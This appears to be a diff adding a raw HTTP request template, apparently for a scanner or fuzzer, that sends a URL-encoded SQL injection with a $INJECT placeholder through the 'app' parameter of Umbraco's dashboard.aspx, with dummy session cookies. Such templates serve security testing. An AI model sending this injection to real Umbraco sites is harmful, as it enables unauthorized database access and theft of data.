@@ -1,0 +1,5 @@
+GET /umbraco/dashboard.aspx?app=x%27%20OR%20$INJECT%20AND%20%271%27=%271 HTTP/1.1
+Host: localhost
+Connection: close
+Cookie: ASP.NET_SessionId=0; UMB_UCONTEXT=0
+
